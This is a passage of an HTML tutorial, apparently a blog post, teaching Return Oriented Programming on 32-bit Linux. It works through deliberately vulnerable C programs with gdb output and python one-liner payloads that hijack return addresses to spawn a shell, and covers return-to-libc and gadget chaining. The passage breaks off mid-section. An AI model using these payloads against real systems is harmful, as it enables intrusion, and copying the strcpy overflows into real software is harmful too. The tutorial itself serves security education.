&lt;p&gt;Return Oriented Programming (ROP) is a powerful technique used to counter common exploit prevention strategies. In particular, ROP is useful for circumventing Address Space Layout Randomization (ASLR)&lt;sup id="fnref-1"&gt;&lt;a class="footnote-ref" href="#fn-1"&gt;1&lt;/a&gt;&lt;/sup&gt; and DEP&lt;sup id="fnref-2"&gt;&lt;a class="footnote-ref" href="#fn-2"&gt;2&lt;/a&gt;&lt;/sup&gt;. When using ROP, an attacker uses his/her control over the stack right before the return from a function to direct code execution to some other location in the program. Except on very hardened binaries, attackers can easily find a portion of code that is located in a fixed location (circumventing ASLR) and which is executable (circumventing DEP). Furthermore, it is relatively straightforward to chain several payloads to achieve (almost) arbitrary code execution. &lt;/p&gt;
&lt;h1&gt;Before we begin&lt;/h1&gt;
&lt;p&gt;If you are attempting to follow along with this tutorial, it might be helpful
to have a Linux machine you can compile and run 32 bit code on. If you install
the correct libraries, you can compile 32 bit code on a 64 bit machine with the
&lt;code&gt;-m32&lt;/code&gt; flag via &lt;code&gt;gcc -m32 hello_world.c&lt;/code&gt;. I will target this tutorial mostly at
32 bit programs because ROP on 64 bit follows the same principles, but is just
slightly more technically challenging. For the purpose of this tutorial, I will
assume that you are familiar with x86 C calling conventions and stack
management. I will attempt to provide a brief explanation
&lt;a href="https://codearcana.com/posts/2013/05/21/a-brief-introduction-to-x86-calling-conventions.html"&gt;here&lt;/a&gt;, but you are encouraged to explore
in more depth on your own. Lastly, you should be familiar with a unix command
line interface.&lt;/p&gt;
&lt;h1&gt;My first ROP&lt;/h1&gt;
&lt;p&gt;The first thing we will do is use ROP to call a function in a very simple binary. In particular, we will be attempting to call &lt;code&gt;not_called&lt;/code&gt; in the following program&lt;sup id="fnref-3"&gt;&lt;a class="footnote-ref" href="#fn-3"&gt;3&lt;/a&gt;&lt;/sup&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;not_called&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Enjoy your shell!&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/bin/bash&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;vulnerable_function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
    &lt;span class="n"&gt;strcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;vulnerable_function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We disassemble the program to learn the information we will need in order to exploit it: the size of the buffer and the address of &lt;code&gt;not_called&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; gdb -q a.out
&lt;span class="go"&gt;Reading symbols from /home/ppp/a.out...(no debugging symbols found)...done.&lt;/span&gt;
&lt;span class="go"&gt;(gdb) disas vulnerable_function &lt;/span&gt;
&lt;span class="go"&gt;Dump of assembler code for function vulnerable_function:&lt;/span&gt;
&lt;span class="go"&gt;   0x08048464 &amp;lt;+0&amp;gt;:  push   %ebp&lt;/span&gt;
&lt;span class="go"&gt;   0x08048465 &amp;lt;+1&amp;gt;:  mov    %esp,%ebp&lt;/span&gt;
&lt;span class="go"&gt;   0x08048467 &amp;lt;+3&amp;gt;:  sub    $0x88,%esp&lt;/span&gt;
&lt;span class="go"&gt;   0x0804846d &amp;lt;+9&amp;gt;:  mov    0x8(%ebp),%eax&lt;/span&gt;
&lt;span class="go"&gt;   0x08048470 &amp;lt;+12&amp;gt;: mov    %eax,0x4(%esp)&lt;/span&gt;
&lt;span class="go"&gt;   0x08048474 &amp;lt;+16&amp;gt;: lea    -0x6c(%ebp),%eax&lt;/span&gt;
&lt;span class="go"&gt;   0x08048477 &amp;lt;+19&amp;gt;: mov    %eax,(%esp)&lt;/span&gt;
&lt;span class="go"&gt;   0x0804847a &amp;lt;+22&amp;gt;: call   0x8048340 &amp;lt;strcpy@plt&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;   0x0804847f &amp;lt;+27&amp;gt;: leave  &lt;/span&gt;
&lt;span class="go"&gt;   0x08048480 &amp;lt;+28&amp;gt;: ret   &lt;/span&gt;
&lt;span class="go"&gt;End of assembler dump.&lt;/span&gt;
&lt;span class="go"&gt;(gdb) print not_called&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;&amp;lt;text variable, no debug info&amp;gt;&lt;span class="o"&gt;}&lt;/span&gt; 0x8048444 &amp;lt;not_called&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We see that &lt;code&gt;not_called&lt;/code&gt; is at &lt;code&gt;0x8048444&lt;/code&gt; and the buffer &lt;code&gt;0x6c&lt;/code&gt; bytes long. Right before the call to &lt;code&gt;strcpy@plt&lt;/code&gt;, the stack in fact looks like:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;| &amp;lt;argument&amp;gt;          |
| &amp;lt;return address&amp;gt;    |
| &amp;lt;old %ebp&amp;gt;          | &amp;lt;= %ebp
| &amp;lt;0x6c bytes of      |
|       ...           |
|       buffer&amp;gt;       |
| &amp;lt;argument&amp;gt;          |
| &amp;lt;address of buffer&amp;gt; | &amp;lt;= %esp
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Since we want our payload to overwrite the return address, we provide 0x6c bytes to fill the buffer, 4 bytes to replace the old &lt;code&gt;%ebp&lt;/code&gt;, and the target address (in this case, the address of &lt;code&gt;not_called&lt;/code&gt;). Our payload looks like:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;| 0x8048444 &amp;lt;not_called&amp;gt;     |
| 0x42424242 &amp;lt;fake old %ebp&amp;gt; |
| 0x41414141 ...             |
|   ... (0x6c bytes of &amp;#39;A&amp;#39;s) |
|   ... 0x41414141           |
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We try this and we get our shell&lt;sup id="fnref-4"&gt;&lt;a class="footnote-ref" href="#fn-4"&gt;4&lt;/a&gt;&lt;/sup&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./a.out &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;print &amp;quot;A&amp;quot;*0x6c + &amp;quot;BBBB&amp;quot; + &amp;quot;\x44\x84\x04\x08&amp;quot;&amp;#39;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;Enjoy your shell!&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; 
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;Calling arguments&lt;/h1&gt;
&lt;p&gt;Now that we can return to an arbitrary function, we want to be able to pass arbitrary arguments. We will exploit this simple program&lt;sup id="fnref-3"&gt;&lt;a class="footnote-ref" href="#fn-3"&gt;3&lt;/a&gt;&lt;/sup&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;not_used&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;not_called&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Not quite a shell...&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/bin/date&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;vulnerable_function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
    &lt;span class="n"&gt;strcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;vulnerable_function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This time, we cannot simply return to &lt;code&gt;not_called&lt;/code&gt;. Instead, we want to call &lt;code&gt;system&lt;/code&gt; with the correct argument. First, we print out the values we need using &lt;code&gt;gdb&lt;/code&gt;:&lt;/p&gt;
&lt;!--
[^6]: There are other ways to do this. `nm` is a popular choice for printing the symbols in a binary, but I don't know

wzxhzdk:6

--&gt;

&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; gdb -q a.out
&lt;span class="go"&gt;Reading symbols from /home/ppp/a.out...(no debugging symbols found)...done.&lt;/span&gt;
&lt;span class="go"&gt;(gdb) pring &amp;#39;system@plt&amp;#39;&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;&amp;lt;text variable, no debug info&amp;gt;&lt;span class="o"&gt;}&lt;/span&gt; 0x8048360 &amp;lt;system@plt&amp;gt;
&lt;span class="go"&gt;(gdb) x/s not_used&lt;/span&gt;
&lt;span class="go"&gt;0x8048580:   &amp;quot;/bin/sh&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;In order to call &lt;code&gt;system&lt;/code&gt; with the argument &lt;code&gt;not_used&lt;/code&gt;, we have to set up the stack. Recall, right after &lt;code&gt;system&lt;/code&gt; is called it expects the stack to look like this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;| &amp;lt;argument&amp;gt;       |
| &amp;lt;return address&amp;gt; |
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We will construct our payload such that the stack looks like a call to &lt;code&gt;system(not_used)&lt;/code&gt; immediately after the return. We thus make our payload:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;| 0x8048580 &amp;lt;not_used&amp;gt;             |
| 0x43434343 &amp;lt;fake return address&amp;gt; |
| 0x8048360 &amp;lt;address of system&amp;gt;    |
| 0x42424242 &amp;lt;fake old %ebp&amp;gt;       |
| 0x41414141 ...                   |
|   ... (0x6c bytes of &amp;#39;A&amp;#39;s)       |
|   ... 0x41414141                 |
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We try this and get out shell:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./a.out &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;print &amp;quot;A&amp;quot;*0x6c + &amp;quot;BBBB&amp;quot; + &amp;quot;\x60\x83\x04\x08&amp;quot; + &amp;quot;CCCC&amp;quot; + &amp;quot;\x80\x85\x04\x08&amp;quot;&amp;#39;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;Return to &lt;code&gt;libc&lt;/code&gt;&lt;/h1&gt;
&lt;p&gt;So far, we've only been looking at contrived binaries that contain the pieces we need for our exploit. Fortunately, ROP is still fairly straightforward without this handicap. The trick is to realize that programs that use functions from a shared library, like &lt;code&gt;printf&lt;/code&gt; from &lt;code&gt;libc&lt;/code&gt;, will link &lt;em&gt;the entire library&lt;/em&gt; into their address space at run time. This means that even if they never call &lt;code&gt;system&lt;/code&gt;, the code for &lt;code&gt;system&lt;/code&gt; (and every other function in &lt;code&gt;libc&lt;/code&gt;) is accessible at runtime. We can see this fairly easy in &lt;code&gt;gdb&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;ulimit&lt;/span&gt; -s unlimited
&lt;span class="gp"&gt;$&lt;/span&gt; gdb -q a.out
&lt;span class="go"&gt;Reading symbols from /home/ppp/a.out...(no debugging symbols found)...done.&lt;/span&gt;
&lt;span class="go"&gt;(gdb) break main&lt;/span&gt;
&lt;span class="go"&gt;Breakpoint 1 at 0x8048404&lt;/span&gt;
&lt;span class="go"&gt;(gdb) run&lt;/span&gt;
&lt;span class="go"&gt;Starting program: /home/ppp/a.out &lt;/span&gt;

&lt;span class="go"&gt;Breakpoint 1, 0x08048404 in main ()&lt;/span&gt;
&lt;span class="go"&gt;(gdb) print system&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;&amp;lt;text variable, no debug info&amp;gt;&lt;span class="o"&gt;}&lt;/span&gt; 0x555d2430 &amp;lt;system&amp;gt;
&lt;span class="go"&gt;(gdb) find 0x555d2430, +999999999999, &amp;quot;/bin/sh&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;0x556f3f18&lt;/span&gt;
&lt;span class="go"&gt;warning: Unable to access target memory at 0x5573a420, halting search.&lt;/span&gt;
&lt;span class="go"&gt;1 pattern found.&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This example illustrates several important tricks. First, the use of &lt;code&gt;ulimit -s unlimited&lt;/code&gt; which will disable library randomization on 32-bit programs. Next, we must run the program and break at main, after libraries are loaded, to print values in shared libraries (but after we do so, then even functions unused by the program are available to us). Last, the &lt;code&gt;libc&lt;/code&gt; library actually contains the string &lt;code&gt;/bin/sh&lt;/code&gt;, which we can find with &lt;code&gt;gdb&lt;/code&gt;&lt;sup id="fnref-7"&gt;&lt;a class="footnote-ref" href="#fn-7"&gt;5&lt;/a&gt;&lt;/sup&gt; use for exploits!&lt;/p&gt;
&lt;p&gt;It is fairly straightforward to plug both of these addresses into our previous exploit:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./a.out &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;print &amp;quot;A&amp;quot;*0x6c + &amp;quot;BBBB&amp;quot; + &amp;quot;\x30\x24\x5d\x55&amp;quot; + &amp;quot;CCCC&amp;quot; + &amp;quot;\x18\x3f\x6f\x55&amp;quot;&amp;#39;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;Chaining gadgets&lt;/h1&gt;
&lt;p&gt;With ROP, it is possible to do far more powerful things than calling a single function. In fact, we can use it to run arbitrary code&lt;sup id="fnref-8"&gt;&lt;a class="footnote-ref" href="#fn-8"&gt;6&lt;/a&gt;&lt;/sup&gt; rather than just calling functions we have available to us. We do this by returning to &lt;em&gt;gadgets&lt;/em&gt;, which are short sequences of instructions ending in a &lt;code&gt;ret&lt;/code&gt;. For example, the following pair of gadgets can be used to write an arbitrary value to an arbitrary location: &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="nv"&gt;%ecx&lt;/span&gt;
&lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="nv"&gt;%eax&lt;/span&gt;
&lt;span class="nf"&gt;ret&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nv"&gt;%eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;%ecx&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="nf"&gt;ret&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;These work by &lt;code&gt;pop&lt;/code&gt;ing values from the stack (which we control) into registers and then executing code that uses them. To use, we set up the stack like so:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;| &amp;lt;address of mov %eax, (%ecx)&amp;gt;        |
| &amp;lt;value to write&amp;gt;                     |
| &amp;lt;address to write to&amp;gt;                |
| &amp;lt;address of pop %ecx; pop %eax; ret&amp;gt; |
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;You'll see that the first gadget returns to the second gadget, continuing the chain of attacker controlled code execution (this next gadget can continue).&lt;/p&gt;
&lt;p&gt;Other useful gadgets include &lt;code&gt;xchg %eax, %esp&lt;/code&gt; and &lt;code&gt;add $0x1c,%esp&lt;/code&gt;, which can be used to modify the stack pointer and &lt;em&gt;pivot&lt;/em&gt; it to a attacker controlled buffer. This is useful if the original vulnerability only gave control over &lt;code&gt;%eip&lt;/code&gt; (like in a &lt;a href="https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html"&gt;format string vulnerability&lt;/a&gt;) or if the attacker does not control very much of the stack (as would be the case for a short buffer overflow).&lt;/p&gt;
&lt;h1&gt;Chaining functions&lt;/h1&gt;
&lt;p&gt;We can also use ROP to chain function calls: rather than a dummy return address, we use a &lt;code&gt;pop; ret&lt;/code&gt; gadget to move the stack above the arguments to the first function. Since we are just using the &lt;code&gt;pop; ret&lt;/code&gt; gadget to adjust the stack, we don't care what register it pops into (the value will be ignored anyways). As an example, we'll exploit the following binary&lt;sup id="fnref-3"&gt;&lt;a class="footnote-ref" href="#fn-3"&gt;3&lt;/a&gt;&lt;/sup&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;exec_string&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;add_bin&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;magic&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;magic&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mh"&gt;0xdeadbeef&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;strcat&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/bin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;add_sh&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;magic1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;magic2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;magic1&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mh"&gt;0xcafebabe&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;magic2&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mh"&gt;0x0badf00d&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;strcat&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/sh&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;vulnerable_function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
    &lt;span class="n"&gt;strcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;vulnerable_function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We can see that the goal is to call &lt;code&gt;add_bin&lt;/code&gt;, then &lt;code&gt;add_sh&lt;/code&gt;, then &lt;code&gt;exec_string&lt;/code&gt;. When we call &lt;code&gt;add_bin&lt;/code&gt;, the stack must look like:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;| &amp;lt;argument&amp;gt;       |
| &amp;lt;return address&amp;gt; |
&lt;/pre&gt;&lt;/div&gt;


